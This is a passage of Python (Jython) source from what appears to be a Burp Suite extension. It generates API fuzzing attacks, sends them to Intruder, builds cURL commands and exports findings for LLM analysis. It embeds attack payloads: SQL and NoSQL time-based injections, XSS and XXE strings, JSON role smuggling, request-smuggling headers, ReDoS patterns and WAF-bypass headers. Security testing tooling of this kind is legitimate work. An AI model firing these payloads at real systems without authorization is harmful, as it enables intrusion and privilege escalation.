# -*- coding: utf-8 -*-
# pylint: disable=import-error
"""Fuzz detection/evidence logic and traffic-capture ingestion helpers."""
import json
import os
import re
import shlex
import threading
import time
import ai_prep_layer
import behavior_analysis
import heavy_runners
import jython_size_helpers
import recon_param_intel

from java.awt import BorderLayout, Color, Dimension, FlowLayout, Font, GridLayout
from java.awt.event import MouseAdapter
from java.io import File, FileWriter
from java.net import URL
from java.text import SimpleDateFormat
from java.util import ArrayList, Date
from javax.swing import (
    BorderFactory,
    Box,
    BoxLayout,
    DefaultListModel,
    JButton,
    JCheckBox,
    JComboBox,
    JLabel,
    JList,
    JMenuItem,
    JOptionPane,
    JPanel,
    JPopupMenu,
    JScrollPane,
    JSplitPane,
    JTabbedPane,
    JTextArea,
    JTextField,
    ListCellRenderer,
    SwingUtilities,
    ToolTipManager,
)
from javax.swing.event import DocumentListener, ListSelectionListener

def _get_json_smuggling(self):
    """JSON smuggling techniques"""
    return ['{"role":"user","role":"admin"}','{"\\u0072ole":"admin"}','{"role\\u0000":"user","role":"admin"}','{"role":["user","admin"]}']

def _get_xml_entity_tricks(self):
    """XML entity manipulation"""
    return ['<!DOCTYPE foo [<!ENTITY x "&#x3c;">]><foo>&x;script></foo>','<![CDATA[<script>alert(1)</script>]]>','&#60;script&#62;alert(1)&#60;/script&#62;','&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;']

def _get_protocol_smuggling(self):
    """HTTP Request Smuggling patterns"""
    return {"chunked":["Transfer-Encoding: chunked","Transfer-Encoding: chunked, identity"],"cl_tricks":["Content-Length: 0","Content-Length: 5\r\nContent-Length: 6"]}

def _get_regex_dos(self):
    """ReDoS patterns"""
    return ["(a+)+b","(a*)*b","(a|a)*b","(a|ab)*c","(.*a){x}","([a-zA-Z]+)*"]

def _get_timing_attacks(self):
    """Timing-based bypass"""
    return {"sql":["'; WAITFOR DELAY '0:0:5'--","'; SELECT SLEEP(5)--","' AND SLEEP(5)--"],"nosql":['{"$where":"sleep(5000)"}','{"$where":"return sleep(5000)"}']}

def _generate_fuzzing(self, attack_type):
    """UI wrapper for fuzzing generation"""
    self.log_to_ui("[*] Generating {} attacks".format(attack_type))
    self.fuzzer_area.setText("[*] Generating {} attacks...\n".format(attack_type))
    lenient_mode = bool(
        hasattr(self, "fuzzer_lenient_checkbox")
        and self.fuzzer_lenient_checkbox is not None
        and self.fuzzer_lenient_checkbox.isSelected()
    )

    if not self.api_data:
        msg = "[!] No endpoints captured. Import data or capture traffic first."
        self.fuzzer_area.setText(msg)
        self.log_to_ui("[!] No endpoints to fuzz")
        return

    api_endpoints, filter_meta = self._collect_fuzzer_targets(strict=not lenient_mode)
    excluded_count = int(filter_meta.get("excluded_endpoints", 0))
    sparse_pool_count = int(filter_meta.get("sparse_candidate_endpoints", 0))
    sparse_added = int(filter_meta.get("sparse_fallback_added", 0))

    if not api_endpoints:
        self.fuzzer_area.setText(
            "[!] No API-like endpoints found after scope/noise filtering (excluded {}).\n"
            "[!] Sparse fallback candidates reviewed: {}.\n".format(
                excluded_count, sparse_pool_count
            )
        )
        return

    self.log_to_ui(
        "[*] Fuzzing {} API-like endpoints (excluded {}, sparse+{})".format(
            len(api_endpoints), excluded_count, sparse_added
        )
    )

    try:
        attacks = self._generate_fuzzing_attacks(api_endpoints, attack_type)
        self.fuzzing_attacks = attacks

        # Count by type and severity
        attack_types = {}
        critical_count = 0
        high_count = 0

        for _, attack in attacks:
            atype = attack["type"]
            attack_types[atype] = attack_types.get(atype, 0) + 1

            # Count severity
            if atype in ["IDOR/BOLA", "BOLA", "Auth Bypass", "SQL Injection", "SSRF", "XXE"]:
                critical_count += 1
            elif atype in ["XSS", "NoSQL Injection", "SSTI", "Deserialization"]:
                high_count += 1

        # Build summary
        summary = []
        summary.append("="*80)
        summary.append("FUZZING CAMPAIGN: {}".format(attack_type))
        summary.append("="*80)
        summary.append("")
        summary.append(
            "[*] Mode: {}".format("Lenient JSON GET" if lenient_mode else "Strict")
        )
        summary.append(
            "[*] Filtered: {} API endpoints (excluded {} static/noisy endpoints)".format(
                len(api_endpoints), excluded_count
            )
        )
        if sparse_added > 0:
            summary.append(
                "[*] Sparse fallback: +{} heuristic endpoints from {} candidates".format(
                    sparse_added, sparse_pool_count
                )
            )
        summary.append(
            "[*] Generated: {} attacks across {} endpoints".format(
                len(attacks), len(set([k for k, a in attacks]))
            )
        )
        high_value_count = len(
            [1 for _, attack in attacks if int((attack or {}).get("_score", 0) or 0) >= 80]
        )
        summary.append(
            "[*] High-value: {} attacks (score >= 80)".format(high_value_count)
        )
        if attacks:
            top_attack = attacks[0][1] or {}
            summary.append(
                "[*] Top-ranked: {} (score {})".format(
                    self._ascii_safe(top_attack.get("type") or ""),
                    int(top_attack.get("_score", 0) or 0),
                )
            )
        summary.append(
            "[*] Critical: {} | High: {} | Medium: {}".format(
                critical_count,
                high_count,
                len(attacks) - critical_count - high_count,
            )
        )
        summary.append("")
        summary.append("[*] Attack Types:")
        for atype, count in sorted(
            attack_types.items(), key=lambda x: x[1], reverse=True
        ):
            summary.append("    {}: {}".format(atype, count))
        summary.append("")

        # Show top 20 attacks only (reduced from 30)
        lines = summary
        lines.append("="*80)
        lines.append("TOP PRIORITY ATTACKS (showing 20/{})".format(len(attacks)))
        lines.append("="*80)
        lines.append("")

        shown = 0
        for key, attack in attacks:
            if shown >= 20:
                break
            lines.extend(self._generate_attack_lines(key, attack))
            shown += 1

        if len(attacks) > 20:
            lines.append("="*80)
            lines.append(
                "[*] {} more attacks not shown. Use filters or export for full list.".format(
                    len(attacks) - 20
                )
            )
            lines.append("="*80)

        # Single batched UI update
        result_text = "\n".join(lines)
        SwingUtilities.invokeLater(lambda: self.fuzzer_area.setText(result_text))
        self.log_to_ui(
            "[+] Generated {} attacks ({} critical, {} high)".format(
                len(attacks), critical_count, high_count
            )
        )
    except Exception as e:
        msg = "[!] Error: {}\n\nCheck Activity Log for details".format(str(e))
        self.fuzzer_area.setText(msg)
        self.log_to_ui("[!] Error generating fuzzing: {}".format(str(e)))
        import traceback

        self._callbacks.printError(traceback.format_exc())

def _send_fuzzing_to_intruder(self):
    """Send generated attacks to Burp Intruder with auto-configured positions"""
    if not self.api_data:
        msg = "[!] No endpoints captured. Import data or capture traffic first."
        self.fuzzer_area.setText(msg)
        self.log_to_ui("[!] No endpoints to send")
        return
    if not self.fuzzing_attacks:
        msg = "[!] Click 'Generate' first to create fuzzing attacks."
        self.fuzzer_area.setText(msg)
        self.log_to_ui("[!] Generate attacks first")
        return

    self.fuzzer_area.append("\n" + "=" * 80 + "\n")
    self.fuzzer_area.append("[*] Sending to Burp Intruder...\n")

    try:
        sent = 0
        for endpoint_key, attack in self.fuzzing_attacks[:10]:
            if endpoint_key not in self.api_data:
                continue

            entries = self.api_data[endpoint_key]
            entry = self._get_entry(entries)

            # Build request with attack positions
            request = self._build_intruder_request(entry, attack)
            if not request:
                continue

            use_https = entry["protocol"] == "https"
            port = (
                entry["port"] if entry["port"] != -1 else (443 if use_https else 80)
            )

            self._callbacks.sendToIntruder(
                entry["host"], port, use_https, self._helpers.stringToBytes(request)
            )
            sent += 1

        self.fuzzer_area.append("[+] Sent {} attacks to Intruder\n".format(sent))
        self.fuzzer_area.append(
            "[+] Check Burp Intruder tab for configured positions (§markers§)\n"
        )
        self.log_to_ui("[+] Sent {} to Intruder".format(sent))
        self.log_to_ui("[+] Check Intruder tab")
    except Exception as e:
        self.fuzzer_area.append("[!] Error: {}\n".format(str(e)))
        self.log_to_ui("[!] Error sending to Intruder: {}".format(str(e)))
        import traceback

        self._callbacks.printError(traceback.format_exc())

def _build_intruder_request(self, entry, attack):
    """Build HTTP request with Intruder attack positions marked"""
    try:
        method = entry["method"]
        path = entry["path"]
        query = entry.get("query_string", "")
        headers = entry.get("headers", {})
        body = entry.get("request_body", "")

        # Mark attack positions based on attack type
        if attack["type"] in ["IDOR/BOLA", "BOLA"]:
            # Mark IDs in path
            path = path.replace("/1", "/§1§").replace("/2", "/§2§")
            import re

            path = re.sub(r"/(\d+)", r"/§\1§", path)

        if attack["type"] == "WAF Bypass":
            # Add WAF bypass headers
            if "bypass_headers" in attack:
                for bypass_header in attack["bypass_headers"][:3]:
                    headers[bypass_header.split(":")[0]] = bypass_header.split(":", 1)[1].strip()

        if attack["type"] in ["SQL Injection", "XSS", "SSTI", "SSRF", "XXE"]:
            # Mark parameters
            if "params" in attack and attack["params"]:
                for param in attack["params"]:
                    query = query.replace("{}=".format(param), "{}=§".format(param))
                    query = query.replace("&", "§&")
            elif "reflected" in attack:
                for param in attack["reflected"]:
                    query = query.replace("{}=".format(param), "{}=§".format(param))
                    query = query.replace("&", "§&")

        # Build request
        full_path = path
        if query:
            full_path += "?" + query

        lines = ["{} {} HTTP/1.1".format(method, full_path)]
        lines.append("Host: {}".format(entry["host"]))

        for k, v in headers.items():
            if k.lower() not in ["host", "content-length"]:
                # Mark auth headers for BOLA/Auth Bypass
                if (
                    attack["type"] in ["BOLA", "Auth Bypass"]
                    and k.lower() == "authorization"
                ):
                    lines.append("{}: §{}§".format(k, v))
                else:
                    lines.append("{}: {}".format(k, v))

        if body:
            lines.append("Content-Length: {}".format(len(body)))
            lines.append("")
            # Mark body params for injection attacks
            if attack["type"] in [
                "SQL Injection",
                "NoSQL Injection",
                "Mass Assignment",
                "SSTI",
                "SSRF",
                "XXE",
            ]:
                body = (
                    body.replace('":', '":§').replace(",", "§,").replace("}", "§}")
                )
            lines.append(body)
        else:
            lines.append("")
            lines.append("")

        return "\r\n".join(lines)
    except Exception as e:
        self._callbacks.printError("Error building request: {}".format(str(e)))
        return None

def _load_success_patterns(self):
    """Load success detection patterns from JSON"""
    import os
    try:
        pattern_file = os.path.join(os.path.dirname(__file__), "success_patterns.json")
        if os.path.exists(pattern_file):
            with open(pattern_file, 'r') as f:
                return json.load(f)
    except Exception as e:
        self._callbacks.printError("Failed to load success patterns: {}".format(str(e)))
    return {}

def _detect_vulnerability(self, response_body, response_status, attack_type):
    """Detect if attack was successful based on response"""
    patterns = getattr(self, 'success_patterns', None)
    if not patterns:
        self.success_patterns = self._load_success_patterns()
        patterns = self.success_patterns

    if attack_type == "SQLI" and "sqli" in patterns:
        for pattern_obj in patterns["sqli"].get("error_based", []):
            if re.search(pattern_obj["pattern"], response_body, re.I):
                return {"vulnerable": True, "confidence": pattern_obj["confidence"],
                        "evidence": "SQL error: {}".format(pattern_obj.get("db", "detected"))}

    elif attack_type == "XSS" and "xss" in patterns:
        for pattern_obj in patterns["xss"].get("reflection", []):
            if re.search(pattern_obj["pattern"], response_body, re.I):
                return {"vulnerable": True, "confidence": pattern_obj["confidence"],
                        "evidence": "XSS payload reflected"}

    elif attack_type == "NoSQL Injection" and "nosqli" in patterns:
        for pattern_obj in patterns["nosqli"].get("error", []):
            if re.search(pattern_obj["pattern"], response_body, re.I):
                return {"vulnerable": True, "confidence": pattern_obj["confidence"],
                        "evidence": "NoSQL error detected"}

    return {"vulnerable": False}

def _select_payloads_for_param(self, param_name, param_value):
    """Context-aware payload selection based on parameter name/value"""
    payloads = []
    param_lower = param_name.lower()

    if re.search(r'email|mail', param_lower):
        payloads.extend(["<script>alert(1)</script>", "' OR '1'='1", "test@test.com'"])[:5]
    elif re.search(r'id|user_id|account', param_lower):
        if param_value and param_value.isdigit():
            payloads.extend(["1", "2", "999", "-1", "0"])[:5]
        elif param_value and len(param_value) == 36:
            payloads.extend(["00000000-0000-0000-0000-000000000000"])[:3]
    elif re.search(r'price|amount|cost|total', param_lower):
        payloads.extend(["-1", "0", "0.01", "999999999"])[:5]
    elif re.search(r'name|user|comment', param_lower):
        payloads.extend(["<script>alert(1)</script>", "{{7*7}}", "' OR '1'='1"])[:5]
    else:
        payloads.extend(["'", "<script>alert(1)</script>", "1' OR '1'='1"])[:3]

    return payloads

def _generate_curl_command(self, entry, payload=None):
    """Generate cURL command for manual testing"""
    method = entry.get("method", "GET")
    protocol = entry.get("protocol", "https")
    host = entry.get("host", "")
    port = entry.get("port", -1)
    path = entry.get("path", "/")
    headers = entry.get("headers", {})
    body = entry.get("request_body", "")

    if port == -1:
        port = 443 if protocol == "https" else 80

    if (protocol == "https" and port == 443) or (protocol == "http" and port == 80):
        url = "{}://{}{}".format(protocol, host, path)
    else:
        url = "{}://{}:{}{}".format(protocol, host, port, path)

    curl = "curl -X {} '{}' \\".format(method, url)

    for header, value in headers.items():
        if header.lower() not in ["host", "content-length"]:
            curl += "\n  -H '{}: {}' \\".format(header, value)

    if payload:
        curl += "\n  -d '{}' \\".format(payload)
    elif body and method in ["POST", "PUT", "PATCH"]:
        curl += "\n  -d '{}' \\".format(body[:200])

    curl += "\n  -i -k -L"
    return curl

def _copy_attack_as_curl(self):
    """Copy first attack as cURL command"""
    if not self.fuzzing_attacks:
        self.fuzzer_area.append("\n[!] Generate attacks first\n")
        return

    endpoint_key, attack = self.fuzzing_attacks[0]
    if endpoint_key not in self.api_data:
        self.fuzzer_area.append("\n[!] Endpoint not found\n")
        return

    entry = self._get_entry(self.api_data[endpoint_key])

    payload = None
    if "payloads" in attack and attack["payloads"]:
        payload = str(attack["payloads"][0])

    curl_cmd = self._generate_curl_command(entry, payload)

    self._copy_to_clipboard(curl_cmd)
    self.fuzzer_area.append("\n[+] Copied cURL command for: {}\n".format(endpoint_key))
    self.fuzzer_area.append("[+] Attack type: {}\n".format(attack["type"]))
    if payload:
        self.fuzzer_area.append("[+] Payload: {}\n".format(payload[:100]))
    self.log_to_ui("[+] Copied cURL command to clipboard")

def _export_payloads(self):
    """Export payloads to file"""
    try:
        import os

        self.log_to_ui("[*] Export Payloads button clicked")
        self.log_to_ui("[*] api_data: {} endpoints".format(len(self.api_data)))
    except Exception as e:
        self.log_to_ui("[!] Error in export init: {}".format(str(e)))
        return

    if not self.api_data:
        msg = "[!] No endpoints captured. Import data or capture traffic first."
        self.fuzzer_area.append("\n" + msg + "\n")
        self.log_to_ui("[!] No endpoints available")
        return

    self.fuzzer_area.append("\n" + "=" * 80 + "\n")
    self.fuzzer_area.append("[*] Exporting payloads...\n")
    export_dir = self._get_export_dir("Payloads")
    if not export_dir:
        return
    filename = os.path.join(export_dir, "payloads.json")
    payloads = {
        "idor": self._get_idor_payloads(),
        "sqli": self._get_sqli_payloads(),
        "xss": self._get_xss_payloads(),
        "nosqli": self._get_nosqli_payloads(),
        "ssrf": self._get_ssrf_payloads(),
        "xxe": self._get_xxe_payloads(),
        "ssti": self._get_ssti_payloads(),
        "deserialization": self._get_deserialization_payloads(),
        "waf_bypass": {
            "headers": self._get_waf_bypass_headers(),
            "encoding": self._get_waf_bypass_encoding(),
            "http_methods": self._get_waf_bypass_http_methods(),
            "path_tricks": self._get_waf_bypass_path_tricks(),
            "content_types": self._get_waf_bypass_content_type(),
        },
    }
    writer = None
    try:
        writer = FileWriter(filename)
        writer.write(json.dumps(payloads, indent=2))
        self.fuzzer_area.append("[+] Exported payloads\n")
        self.fuzzer_area.append(
            "[+] Categories: idor, sqli, xss, nosqli, ssrf, xxe, ssti, deserialization, waf_bypass\n"
        )
        self.fuzzer_area.append("[+] Folder: {}\n".format(export_dir))
        self.fuzzer_area.append("[+] File: {}\n".format(filename))
        self.log_to_ui("[+] Exported payloads to: {}".format(export_dir))
    except Exception as e:
        self.fuzzer_area.append("[!] Export failed: {}\n".format(str(e)))
        self.log_to_ui("[!] Payload export failed: {}".format(str(e)))
        import traceback

        self._callbacks.printError(traceback.format_exc())
    finally:
        if writer:
            try:
                writer.close()
            except Exception as e:
                self._callbacks.printError(
                    "Error closing payloads file: {}".format(str(e))
                )

def _export_ai_context(self):
    """Export rich AI analysis bundle from captured + generated findings."""
    import os

    if not self.api_data:
        msg = "[!] No endpoints captured. Import data or capture traffic first."
        self.fuzzer_area.append("\n" + msg + "\n")
        self.log_to_ui(msg)
        return

    with self.lock:
        data_snapshot = dict(self.api_data)
    attacks_snapshot = list(getattr(self, "fuzzing_attacks", []) or [])

    if not attacks_snapshot:
        self.fuzzer_area.append(
            "\n[*] No fuzzing attacks found yet; exporting context from captured API traffic only.\n"
        )

    self.fuzzer_area.append("\n" + "=" * 80 + "\n")
    self.fuzzer_area.append("[*] Exporting enhanced AI context bundle...\n")

    export_dir = self._get_export_dir("AI_Context")
    if not export_dir:
        return

    bundle = self._build_ai_export_bundle(data_snapshot, attacks_snapshot)
    bundle, schema_validation = self._validate_ai_bundle_schema(bundle)
    schema_contract = self._build_ai_bundle_schema_contract()
    validation_warnings = list(schema_validation.get("warnings", []) or [])
    validation_errors = list(schema_validation.get("errors", []) or [])
    if validation_warnings:
        self.fuzzer_area.append(
            "[*] AI schema validation warnings: {}\n".format(len(validation_warnings))
        )
    if validation_errors:
        self.fuzzer_area.append(
            "[!] AI schema validation errors: {} (defaults applied)\n".format(
                len(validation_errors)
            )
        )
    if validation_warnings or validation_errors:
        summary = " | ".join(
            [
                "{} warning(s)".format(len(validation_warnings)),
                "{} error(s)".format(len(validation_errors)),
            ]
        )
        self.log_to_ui("[*] AI bundle schema validation: {}".format(summary))
    files_to_write = [
        ("ai_context.json", bundle.get("legacy_context", {})),
        ("ai_bundle.json", bundle),
        ("ai_bundle_schema_contract.json", schema_contract),
        ("ai_bundle_schema_validation.json", schema_validation),
        ("ai_vulnerability_context.json", bundle.get("vulnerability_context", {})),
        ("ai_all_tabs_context.json", bundle.get("all_tabs_context", {})),
        ("ai_behavioral_analysis.json", bundle.get("behavioral_analysis", {})),
        (
            "ai_counterfactual_differential_findings.json",
            bundle.get("counterfactual_differentials", {}).get("findings", []),
        ),
        (
            "ai_counterfactual_differential_summary.json",
            bundle.get("counterfactual_differentials", {}).get("summary", {}),
        ),
        (
            "ai_sequence_invariant_findings.json",
            bundle.get("sequence_invariants", {}).get("findings", []),
        ),
        (
            "ai_sequence_evidence_ledger.json",
            bundle.get("sequence_invariants", {}).get("ledger", {}),
        ),
        (
            "ai_golden_ticket_findings.json",
            bundle.get("golden_tickets", {}).get("findings", []),
        ),
        (
            "ai_golden_ticket_ledger.json",
            bundle.get("golden_tickets", {}).get("ledger", {}),
        ),
        (
            "ai_state_transition_findings.json",
            bundle.get("state_transitions", {}).get("findings", []),
        ),
        (
            "ai_state_transition_ledger.json",
            bundle.get("state_transitions", {}).get("ledger", {}),
        ),
        (
            "ai_token_lineage_findings.json",
            bundle.get("token_lineage", {}).get("findings", []),
        ),
        (
            "ai_token_lineage_ledger.json",
            bundle.get("token_lineage", {}).get("ledger", {}),
        ),
        (
            "ai_parity_drift_findings.json",
            bundle.get("parity_drift", {}).get("findings", []),
        ),
        (
            "ai_parity_drift_ledger.json",
            bundle.get("parity_drift", {}).get("ledger", {}),
        ),
        ("ai_feedback_template.json", bundle.get("feedback_template", {})),
        ("ai_openai_request.json", bundle.get("llm_exports", {}).get("openai", {})),
        (
            "ai_anthropic_request.json",
            bundle.get("llm_exports", {}).get("anthropic", {}),
        ),
        ("ai_ollama_request.json", bundle.get("llm_exports", {}).get("local", {})),
    ]
    if self._ai_prep_layer_enabled():
        prep_layer = bundle.get("ai_prep_layer", {}) or {}
        files_to_write.extend(
            [
                (
                    "ai_prep_invariant_hints.json",
                    prep_layer.get("invariant_hints", {}),
                ),
                (
                    "ai_prep_sequence_candidates.json",
                    prep_layer.get("sequence_candidates", {}),
                ),
                (
                    "ai_prep_evidence_graph.json",
                    prep_layer.get("evidence_graph", {}),
                ),
            ]
        )

    written_files = []
    for filename_only, payload in files_to_write:
        writer = None
        filepath = os.path.join(export_dir, filename_only)
        try:
            writer = FileWriter(filepath)
            writer.write(json.dumps(payload, indent=2))
            written_files.append(filepath)
        except Exception as e:
            self._callbacks.printError(
                "AI export write failed ({}): {}".format(filename_only, str(e))
            )
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "AI export close failed ({}): {}".format(filename_only, str(e))
                    )

    if not written_files:
        self.fuzzer_area.append("[!] AI export failed: no files were written\n")
        self.log_to_ui("[!] AI context export failed")
        return

    self.fuzzer_area.append(
        "[+] Exported enhanced AI context files: {}\n".format(len(written_files))
    )
    self.fuzzer_area.append("[+] Feed these files to ChatGPT/Claude/Ollama\n")
    self.fuzzer_area.append("[+] Folder: {}\n".format(export_dir))
    for filepath in written_files:
        self.fuzzer_area.append("[+] File: {}\n".format(filepath))
    self.log_to_ui("[+] Exported enhanced AI context to: {}".format(export_dir))

def _build_ai_export_bundle(self, data_snapshot, attacks_snapshot):
    """Build one consolidated structure for AI-focused analysis/export."""
    vulnerability_context = self._export_vulnerability_context_for_ai(
        data_snapshot, attacks_snapshot
    )
    behavioral_analysis = self._export_behavioral_analysis(data_snapshot)
    counterfactual_differentials = self._build_counterfactual_differential_package(
        data_snapshot
    )
    sequence_invariants = self._build_sequence_invariant_package(data_snapshot)
    golden_tickets = self._build_golden_ticket_package(data_snapshot)
    state_transitions = self._build_state_transition_package(data_snapshot)
    token_lineage = self._build_token_lineage_package(data_snapshot)
    parity_drift = self._build_parity_drift_package(data_snapshot)
    self._sort_and_store_counterfactual_payload(
        counterfactual_differentials,
        source_label="ai_export",
        scope_label="All Endpoints",
        target_count=len(data_snapshot),
    )
    self._sort_and_store_sequence_invariant_payload(
        sequence_invariants,
        source_label="ai_export",
        scope_label="All Endpoints",
        target_count=len(data_snapshot),
    )
    self._sort_and_store_golden_ticket_payload(
        golden_tickets,
        source_label="ai_export",
        scope_label="All Endpoints",
        target_count=len(data_snapshot),
    )
    self._sort_and_store_state_transition_payload(
        state_transitions,
        source_label="ai_export",
        scope_label="All Endpoints",
        target_count=len(data_snapshot),
    )
    self._sort_and_store_token_lineage_payload(
        token_lineage,
        source_label="ai_export",
        scope_label="All Endpoints",
        target_count=len(data_snapshot),
    )
    self._sort_and_store_parity_drift_payload(
        parity_drift,
        source_label="ai_export",
        scope_label="All Endpoints",
        target_count=len(data_snapshot),
    )
    feedback_template = self._create_ai_feedback_loop_export([])
    all_tabs_context = self._collect_all_tabs_ai_context(
        data_snapshot, attacks_snapshot
    )

    legacy_endpoints = []
    for endpoint_key, attack in attacks_snapshot[:20]:
        entries = data_snapshot.get(endpoint_key)
        if not entries:
            continue
        entry = self._get_entry(entries)
        legacy_endpoints.append(
            {
                "endpoint": endpoint_key,
                "method": entry.get("method", ""),
                "path": entry.get("normalized_path", ""),
                "attack_type": self._ascii_safe((attack or {}).get("type") or ""),
                "params": entry.get("parameters", {}) or {},
                "auth": entry.get("auth_detected", []) or [],
                "sample_request": self._format_ai_sample(entry),
            }
        )
    if (not legacy_endpoints) and data_snapshot:
        for endpoint_key, entries in sorted(data_snapshot.items(), key=lambda item: item[0])[:20]:
            entry = self._get_entry(entries)
            legacy_endpoints.append(
                {
                    "endpoint": endpoint_key,
                    "method": entry.get("method", ""),
                    "path": entry.get("normalized_path", ""),
                    "attack_type": "Unknown",
                    "params": entry.get("parameters", {}) or {},
                    "auth": entry.get("auth_detected", []) or [],
                    "sample_request": self._format_ai_sample(entry),
                }
            )

    legacy_context = {
        "task": "Generate custom payloads for API security testing",
        "endpoints": legacy_endpoints,
        "prompt": self._generate_ai_prompt(),
    }

    ai_input = {
        "scan_metadata": vulnerability_context.get("scan_metadata", {}),
        "vulnerabilities": vulnerability_context.get("vulnerabilities", []),
        "api_patterns": vulnerability_context.get("api_patterns", {}),
        "authentication_flows": vulnerability_context.get("authentication_flows", {}),
        "business_logic_hints": vulnerability_context.get("business_logic_hints", []),
        "behavioral_analysis": behavioral_analysis,
        "counterfactual_differentials": counterfactual_differentials,
        "sequence_invariants": sequence_invariants,
        "golden_tickets": golden_tickets,
        "state_transitions": state_transitions,
        "token_lineage": token_lineage,
        "parity_drift": parity_drift,
        "all_tabs_context": all_tabs_context,
    }
    llm_exports = {
        "openai": self._export_for_llm_platform("openai", ai_input),
        "anthropic": self._export_for_llm_platform("anthropic", ai_input),
        "local": self._export_for_llm_platform("local", ai_input),
    }
    ai_prep_layer = {}
    if self._ai_prep_layer_enabled():
        ai_prep_layer = self._build_ai_prep_layer(
            data_snapshot, attacks_snapshot
        )

    return {
        "metadata": {
            "generated_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_endpoints": len(data_snapshot),
            "total_attacks": len(attacks_snapshot),
            "vulnerability_count": len(
                vulnerability_context.get("vulnerabilities", [])
            ),
            "counterfactual_differential_count": int(
                counterfactual_differentials.get("finding_count", 0) or 0
            ),
            "sequence_invariant_count": int(
                sequence_invariants.get("finding_count", 0) or 0
            ),
            "golden_ticket_count": int(
                golden_tickets.get("finding_count", 0) or 0
            ),
            "state_transition_count": int(
                state_transitions.get("finding_count", 0) or 0
            ),
            "token_lineage_count": int(
                token_lineage.get("finding_count", 0) or 0
            ),
            "parity_drift_count": int(
                parity_drift.get("finding_count", 0) or 0
            ),
        },
        "legacy_context": legacy_context,
        "vulnerability_context": vulnerability_context,
        "all_tabs_context": all_tabs_context,
        "behavioral_analysis": behavioral_analysis,
        "feedback_template": feedback_template,
        "enhanced_prompt": self._generate_enhanced_ai_prompt(),
        "llm_exports": llm_exports,
        "ai_prep_layer": ai_prep_layer,
        "counterfactual_differentials": counterfactual_differentials,
        "sequence_invariants": sequence_invariants,
        "golden_tickets": golden_tickets,
        "state_transitions": state_transitions,
        "token_lineage": token_lineage,
        "parity_drift": parity_drift,
    }

def _build_ai_bundle_schema_contract(self):
    """Return a lightweight schema contract for AI export bundle structure."""
    return {
        "schema_version": "1.0",
        "type": "object",
        "required": [
            "metadata",
            "legacy_context",
            "vulnerability_context",
            "all_tabs_context",
            "behavioral_analysis",
            "feedback_template",
            "enhanced_prompt",
            "llm_exports",
            "counterfactual_differentials",
            "sequence_invariants",
            "golden_tickets",
            "state_transitions",
            "token_lineage",
            "parity_drift",
            "ai_prep_layer",
        ],
        "properties": {
            "metadata": {"type": "object"},
            "legacy_context": {"type": "object"},
            "vulnerability_context": {"type": "object"},
            "all_tabs_context": {"type": "object"},
            "behavioral_analysis": {"type": "object"},
            "feedback_template": {"type": "object"},
            "enhanced_prompt": {"type": "string"},
            "llm_exports": {
                "type": "object",
                "required": ["openai", "anthropic", "local"],
            },
            "counterfactual_differentials": {
                "type": "object",
                "required": ["findings", "summary"],
            },
            "sequence_invariants": {
                "type": "object",
                "required": ["findings", "ledger"],
            },
            "golden_tickets": {
                "type": "object",
                "required": ["findings", "ledger"],
            },
            "state_transitions": {
                "type": "object",
                "required": ["findings", "ledger"],
            },
            "token_lineage": {
                "type": "object",
                "required": ["findings", "ledger"],
            },
            "parity_drift": {
                "type": "object",
                "required": ["findings", "ledger"],
            },
            "ai_prep_layer": {"type": "object"},
        },
    }

def _validate_ai_bundle_schema(self, bundle):
    """Lightweight AI bundle schema validation with safe defaults."""
    report = {
        "schema_version": "1.0",
        "checked_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "errors": [],
        "warnings": [],
        "applied_defaults": [],
    }
    root = bundle if isinstance(bundle, dict) else {}
    if not isinstance(bundle, dict):
        report["errors"].append(
            "bundle_root_type_invalid: expected object, got {}".format(
                self._ascii_safe(type(bundle).__name__)
            )
        )

    def ensure_object(key):
        value = root.get(key)
        if isinstance(value, dict):
            return value
        if value is None:
            report["warnings"].append("missing_object: {}".format(key))
        else:
            report["errors"].append(
                "invalid_object: {} ({})".format(
                    key, self._ascii_safe(type(value).__name__)
                )
            )
        root[key] = {}
        report["applied_defaults"].append("{}={{}}".format(key))
        return root[key]

    metadata = ensure_object("metadata")
    ensure_object("legacy_context")
    ensure_object("vulnerability_context")
    ensure_object("all_tabs_context")
    ensure_object("behavioral_analysis")
    ensure_object("feedback_template")
    ensure_object("ai_prep_layer")

    try:
        string_types = (basestring,)
    except NameError:
        string_types = (str,)
    if not isinstance(root.get("enhanced_prompt"), string_types):
        root["enhanced_prompt"] = self._ascii_safe(
            root.get("enhanced_prompt") or self._generate_enhanced_ai_prompt()
        )
        report["applied_defaults"].append("enhanced_prompt=<generated>")
        report["warnings"].append("enhanced_prompt_not_string")

    def to_int(value, fallback=0):
        if isinstance(value, bool):
            return int(value)
        if isinstance(value, (int, float)):
            return int(value)
        text = self._ascii_safe(value).strip()
        if text and re.match(r"^-?\d+$", text):
            return int(text)
        return int(fallback)

    if not metadata.get("generated_at"):
        metadata["generated_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
        report["applied_defaults"].append("metadata.generated_at=<now>")
    for count_key in [
        "total_endpoints",
        "total_attacks",
        "vulnerability_count",
        "counterfactual_differential_count",
        "sequence_invariant_count",
        "golden_ticket_count",
        "state_transition_count",
        "token_lineage_count",
        "parity_drift_count",
    ]:
        if count_key not in metadata:
            metadata[count_key] = 0
            report["applied_defaults"].append("metadata.{}=0".format(count_key))
        else:
            parsed = to_int(metadata.get(count_key), fallback=0)
            if parsed != metadata.get(count_key):
                report["warnings"].append(
                    "metadata_non_numeric_counter: {}".format(count_key)
                )
                metadata[count_key] = parsed

    llm_exports = ensure_object("llm_exports")
    for provider in ["openai", "anthropic", "local"]:
        value = llm_exports.get(provider)
        if not isinstance(value, dict):
            llm_exports[provider] = {}
            report["applied_defaults"].append("llm_exports.{}={{}}".format(provider))
            report["warnings"].append("llm_exports_missing_provider: {}".format(provider))

    def ensure_findings_block(key):
        block = ensure_object(key)
        findings = block.get("findings")
        ledger = block.get("ledger")
        if not isinstance(findings, list):
            block["findings"] = []
            report["applied_defaults"].append("{}.findings=[]".format(key))
            report["warnings"].append("invalid_findings_array: {}".format(key))
        if not isinstance(ledger, dict):
            block["ledger"] = {}
            report["applied_defaults"].append("{}.ledger={{}}".format(key))
            report["warnings"].append("invalid_ledger_object: {}".format(key))
        block["finding_count"] = to_int(
            block.get("finding_count"), fallback=len(block.get("findings", []))
        )
        return block

    def ensure_scoreless_block(key):
